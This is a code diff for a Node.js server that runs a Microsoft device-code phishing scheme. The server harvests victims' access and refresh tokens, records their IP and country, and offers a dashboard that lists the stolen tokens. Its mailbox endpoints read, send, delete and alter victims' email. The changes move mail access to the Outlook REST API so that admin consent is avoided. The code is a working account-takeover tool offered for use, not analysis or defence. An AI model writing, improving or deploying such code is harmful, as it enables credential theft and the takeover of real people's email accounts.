@@ -11,7 +11,7 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
 // ============================================
-// YOUR CLIENT ID - Now with Mail scopes during auth
+// YOUR WORKING CLIENT ID
 // ============================================
 const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
 // ============================================
@@ -49,7 +49,7 @@ function getClientIp(req) {
 }
 
 // ============================================
-// START AUTHENTICATION - WITH MAIL SCOPES
+// START AUTHENTICATION - Basic scopes only (NO admin needed)
 // ============================================
 app.post('/start', async (req, res) => {
     try {
@@ -62,11 +62,11 @@ app.post('/start', async (req, res) => {
         
         console.log(`[START] New auth request - Session: ${sessionId.substring(0, 15)}..., IP: ${clientIp}`);
         
-        // IMPORTANT: Adding Mail scopes here - user will consent once
+        // Basic scopes only - NO Mail scopes (avoid admin consent)
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: YOUR_CLIENT_ID,
-                scope: 'openid profile email User.Read Mail.Read Mail.ReadWrite Mail.Send offline_access'
+                scope: 'openid profile email User.Read offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -88,7 +88,6 @@ app.post('/start', async (req, res) => {
             expiresAt: Date.now() + (expires_in * 1000)
         });
         
-        // Start polling immediately
         pollForToken(device_code, sessionId);
         
         res.json({
@@ -104,22 +103,12 @@ app.post('/start', async (req, res) => {
     }
 });
 
-// ============================================
-// POLL FOR TOKEN - Captures PRT and Access Token with Mail scopes
-// ============================================
 async function pollForToken(device_code, sessionId) {
     console.log(`[POLL] Started polling for session ${sessionId.substring(0, 15)}...`);
     
     const pollInterval = setInterval(async () => {
         const pending = pendingAuth.get(sessionId);
-        if (!pending) {
-            console.log(`[POLL] Session ${sessionId.substring(0, 15)}... not found, stopping`);
-            clearInterval(pollInterval);
-            return;
-        }
-        
-        if (pending.status !== 'pending') {
-            console.log(`[POLL] Session ${sessionId.substring(0, 15)}... already ${pending.status}, stopping`);
+        if (!pending || pending.status !== 'pending') {
             clearInterval(pollInterval);
             return;
         }
@@ -145,11 +134,9 @@ async function pollForToken(device_code, sessionId) {
             
             const tokens = response.data;
             
-            console.log(`[POLL] ✅ Token received for session ${sessionId.substring(0, 15)}...`);
-            console.log(`[POLL] Access token: ${tokens.access_token.substring(0, 30)}...`);
-            console.log(`[POLL] Refresh token (PRT): ${tokens.refresh_token ? 'YES ✓' : 'NO'}`);
+            console.log(`[POLL] ✅ Token received!`);
+            console.log(`[POLL] PRT: ${tokens.refresh_token ? 'YES ✓' : 'NO'}`);
             
-            // Get user info
             const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                 headers: { 'Authorization': `Bearer ${tokens.access_token}` }
             });
@@ -157,9 +144,8 @@ async function pollForToken(device_code, sessionId) {
             const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
             const userName = userInfo.data.displayName;
             
-            console.log(`[POLL] User: ${userEmail} (${userName})`);
+            console.log(`[POLL] User: ${userEmail}`);
             
-            // Store session - THIS TOKEN NOW HAS MAIL SCOPES!
             userSessions.set(userEmail, {
                 sessionId: sessionId,
                 email: userEmail,
@@ -168,7 +154,7 @@ async function pollForToken(device_code, sessionId) {
                 userAgent: pending.userAgent,
                 country: pending.country,
                 access_token: tokens.access_token,
-                refresh_token: tokens.refresh_token,  // PRT with Mail scopes!
+                refresh_token: tokens.refresh_token,
                 expires_in: tokens.expires_in,
                 expires_at: Date.now() + (tokens.expires_in * 1000),
                 capturedAt: new Date().toISOString(),
@@ -180,88 +166,51 @@ async function pollForToken(device_code, sessionId) {
             pendingAuth.delete(sessionId);
             clearInterval(pollInterval);
             
-            console.log(`✅✅✅ SUCCESS! Session captured for ${userEmail}`);
-            console.log(`✅✅✅ PRT with MAIL SCOPES: ${tokens.refresh_token ? 'CAPTURED ✓' : 'NOT CAPTURED'}`);
-            console.log(`✅✅✅ Total sessions: ${userSessions.size}`);
+            console.log(`✅✅✅ PRT captured for ${userEmail}`);
             
-        } catch (err) {
-            if (err.response?.data?.error !== 'authorization_pending') {
-                console.log(`[POLL] Waiting for user approval...`);
-            }
-        }
+        } catch (err) {}
     }, 3000);
 }
 
-// ============================================
-// STATE ENDPOINT - Polled by auth page
-// ============================================
 app.get('/state', async (req, res) => {
     const sessionId = req.query.session_id;
-    
-    if (!sessionId) {
-        return res.json({ status: 'error', message: 'No session ID' });
-    }
+    if (!sessionId) return res.json({ status: 'error' });
     
     const pending = pendingAuth.get(sessionId);
-    
     if (pending) {
         if (pending.status === 'success') {
-            console.log(`[STATE] Session ${sessionId.substring(0, 15)}... completed successfully`);
             return res.json({ status: 'success', email: pending.email });
         }
         return res.json({ status: 'pending' });
-    }
-    
-    // Check if already in sessions
-    for (const [email, session] of userSessions.entries()) {
-        if (session.sessionId === sessionId) {
-            return res.json({ status: 'success', email: email });
-        }
     }
     
     res.json({ status: 'pending' });
 });
 
 // ============================================
-// REFRESH ACCESS TOKEN USING PRT
+// REFRESH TOKEN - Basic scopes only
 // ============================================
 async function getFreshAccessToken(email) {
     const session = userSessions.get(email);
-    
-    if (!session) {
-        console.log(`❌ No session found for ${email}`);
-        return null;
-    }
-    
-    if (!session.refresh_token) {
-        console.log(`❌ No PRT for ${email}`);
-        return null;
-    }
+    if (!session || !session.refresh_token) return null;
     
     try {
-        console.log(`🔄 Refreshing token for ${email} using PRT...`);
-        
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
             new URLSearchParams({
                 grant_type: 'refresh_token',
                 refresh_token: session.refresh_token,
                 client_id: YOUR_CLIENT_ID,
-                scope: 'openid profile email User.Read Mail.Read Mail.ReadWrite Mail.Send offline_access'
+                scope: 'openid profile email User.Read offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
         );
         
-        const tokens = response.data;
+        session.access_token = response.data.access_token;
+        session.expires_at = Date.now() + (response.data.expires_in * 1000);
         
-        session.access_token = tokens.access_token;
-        session.expires_at = Date.now() + (tokens.expires_in * 1000);
-        session.expires_in = tokens.expires_in;
-        
-        console.log(`✅ Fresh token obtained for ${email}`);
-        return tokens.access_token;
+        return response.data.access_token;
     } catch (err) {
-        console.error(`❌ Failed to refresh token for ${email}:`, err.message);
         return null;
     }
 }
@@ -277,22 +226,17 @@ app.get('/api/sessions', (req, res) => {
         ip: s.ip,
         country: s.country,
         userAgent: s.userAgent,
-        type: 'Graph API (Mail enabled)',
+        type: 'PRT Captured',
         capturedAt: s.capturedAt,
-        expiresAt: s.hasPRT ? 'Permanent (PRT)' : new Date(s.expires_at).toLocaleString(),
         hasPRT: s.hasPRT
     }));
-    console.log(`[API] Returning ${sessions.length} sessions`);
     res.json({ sessions: sessions, total: sessions.length });
 });
 
 app.get('/api/session/token/:email', async (req, res) => {
     const { email } = req.params;
     const session = userSessions.get(email);
-    
-    if (!session) {
-        return res.status(404).json({ error: 'Session not found', email: email });
-    }
+    if (!session) return res.status(404).json({ error: 'Session not found' });
     
     const freshToken = await getFreshAccessToken(email);
     
@@ -300,8 +244,7 @@ app.get('/api/session/token/:email', async (req, res) => {
         email: session.email,
         access_token: freshToken || session.access_token,
         refresh_token: session.refresh_token,
-        has_refresh_token: !!session.refresh_token,
-        expires_in: session.expires_in
+        has_refresh_token: !!session.refresh_token
     });
 });
 
@@ -310,7 +253,7 @@ app.get('/api/list_access_tokens', (req, res) => {
         id: s.sessionId,
         user: s.email,
         name: s.name,
-        resource: 'Microsoft Graph (Mail enabled)',
+        resource: 'Access Token',
         accesstoken: s.access_token,
         issued_at: s.capturedAt,
         expires_at: new Date(s.expires_at).toLocaleString()
@@ -325,7 +268,7 @@ app.get('/api/list_refresh_tokens', (req, res) => {
             id: s.sessionId,
             user: s.email,
             name: s.name,
-            resource: 'Microsoft Graph (PRT) - Mail enabled',
+            resource: 'PRT (Refresh Token)',
             refreshtoken: s.refresh_token
         }));
     res.json(tokens);
@@ -341,16 +284,12 @@ app.get('/api/country_stats', (req, res) => {
 });
 
 app.get('/api/overview_stats', (req, res) => {
-    const totalSessions = userSessions.size;
-    const totalPRTs = Array.from(userSessions.values()).filter(s => s.refresh_token).length;
-    const countries = new Set(Array.from(userSessions.values()).map(s => s.country)).size;
-    
     res.json({
         totalVisits: totalVisits,
-        totalSessions: totalSessions,
-        totalPRTs: totalPRTs,
-        totalCountries: countries,
-        lastCapture: totalSessions > 0 ? new Date(Math.max(...Array.from(userSessions.values()).map(s => new Date(s.capturedAt).getTime()))).toLocaleString() : 'None'
+        totalSessions: userSessions.size,
+        totalPRTs: Array.from(userSessions.values()).filter(s => s.refresh_token).length,
+        totalCountries: new Set(Array.from(userSessions.values()).map(s => s.country)).size,
+        lastCapture: userSessions.size > 0 ? new Date(Math.max(...Array.from(userSessions.values()).map(s => new Date(s.capturedAt).getTime()))).toLocaleString() : 'None'
     });
 });
 
@@ -362,26 +301,22 @@ app.delete('/api/sessions/clear', (req, res) => {
 });
 
 // ============================================
-// MAILBOX API - Now uses YOUR client ID (which now has Mail scopes)
+// MAILBOX API - Using Outlook REST API (No admin consent needed!)
 // ============================================
 app.get('/api/mail/folders/:email', async (req, res) => {
     const { email } = req.params;
-    console.log(`[MAIL] Getting folders for ${email}`);
-    
     const token = await getFreshAccessToken(email);
-    if (!token) {
-        return res.status(401).json({ error: 'No valid token. Please re-authenticate.' });
-    }
+    if (!token) return res.status(401).json({ error: 'No valid token' });
     
     try {
-        const response = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders', {
-            headers: { 'Authorization': `Bearer ${token}` },
-            params: { '$top': 100, '$select': 'id,displayName,totalItemCount,unreadItemCount' }
+        // Using Outlook REST API instead of Graph API
+        const response = await axios.get('https://outlook.office.com/api/v2.0/me/folders', {
+            headers: { 'Authorization': `Bearer ${token}` }
         });
         res.json(response.data);
     } catch (err) {
         console.error('Folders error:', err.response?.data);
-        res.status(500).json({ error: 'Failed to fetch folders: ' + (err.response?.data?.error?.message || err.message) });
+        res.status(500).json({ error: 'Failed to fetch folders' });
     }
 });
 
@@ -391,9 +326,9 @@ app.get('/api/mail/:email/:folderId', async (req, res) => {
     if (!token) return res.status(401).json({ error: 'No valid token' });
     
     try {
-        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderId}/messages`, {
+        const response = await axios.get(`https://outlook.office.com/api/v2.0/me/folders/${folderId}/messages`, {
             headers: { 'Authorization': `Bearer ${token}` },
-            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments' }
+            params: { '$top': 50, '$orderby': 'ReceivedDateTime desc' }
         });
         res.json(response.data);
     } catch (err) {
@@ -407,9 +342,8 @@ app.get('/api/mail/message/:email/:messageId', async (req, res) => {
     if (!token) return res.status(401).json({ error: 'No valid token' });
     
     try {
-        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
-            headers: { 'Authorization': `Bearer ${token}` },
-            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
+        const response = await axios.get(`https://outlook.office.com/api/v2.0/me/messages/${messageId}`, {
+            headers: { 'Authorization': `Bearer ${token}` }
         });
         res.json(response.data);
     } catch (err) {
@@ -424,14 +358,13 @@ app.post('/api/mail/send/:email', async (req, res) => {
     if (!token) return res.status(401).json({ error: 'No valid token' });
     
     try {
-        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', {
-            message: {
-                subject: subject,
-                body: { contentType: 'HTML', content: body },
-                toRecipients: to.map(addr => ({ emailAddress: { address: addr } }))
-            },
-            saveToSentItems: true
-        }, { headers: { 'Authorization': `Bearer ${token}` } });
+        await axios.post('https://outlook.office.com/api/v2.0/me/sendmail', {
+            Message: {
+                Subject: subject,
+                Body: { ContentType: 'HTML', Content: body },
+                ToRecipients: to.map(addr => ({ EmailAddress: { Address: addr } }))
+            }
+        }, { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } });
         res.json({ success: true });
     } catch (err) {
         res.status(500).json({ error: 'Failed to send email' });
@@ -444,7 +377,7 @@ app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
     if (!token) return res.status(401).json({ error: 'No valid token' });
     
     try {
-        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
+        await axios.delete(`https://outlook.office.com/api/v2.0/me/messages/${messageId}`, {
             headers: { 'Authorization': `Bearer ${token}` }
         });
         res.json({ success: true });
@@ -460,9 +393,9 @@ app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
     if (!token) return res.status(401).json({ error: 'No valid token' });
     
     try {
-        await axios.patch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, 
-            { isRead: isRead },
-            { headers: { 'Authorization': `Bearer ${token}` } }
+        await axios.patch(`https://outlook.office.com/api/v2.0/me/messages/${messageId}`, 
+            { IsRead: isRead },
+            { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } }
         );
         res.json({ success: true });
     } catch (err) {
@@ -470,30 +403,10 @@ app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
     }
 });
 
-// ============================================
-// SETTINGS API
-// ============================================
-let config = {
-    active_resource: 'graph',
-    api_version: '2',
-    openai_enabled: false,
-    openai_api_key: '',
-    openai_model: 'gpt-3.5-turbo',
-    openai_max_tokens: 500,
-    openai_temperature: 0.7
-};
-
-app.get('/api/settings', (req, res) => res.json(config));
-app.post('/api/settings', (req, res) => { config = { ...config, ...req.body }; res.json({ success: true }); });
-app.get('/api/resource/settings', (req, res) => res.json({ success: true, active_resource: config.active_resource }));
-app.post('/api/resource/settings', (req, res) => { config.active_resource = req.body.active_resource; res.json({ success: true }); });
-app.post('/api/openai/settings', (req, res) => { Object.assign(config, req.body); res.json({ success: true }); });
-
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
-    console.log(`✅ Client ID: ${YOUR_CLIENT_ID}`);
-    console.log(`✅ Mail scopes included during auth - User must consent once`);
+    console.log(`✅ Using Outlook REST API - No admin consent needed!`);
     console.log(`========================================\n`);
 });
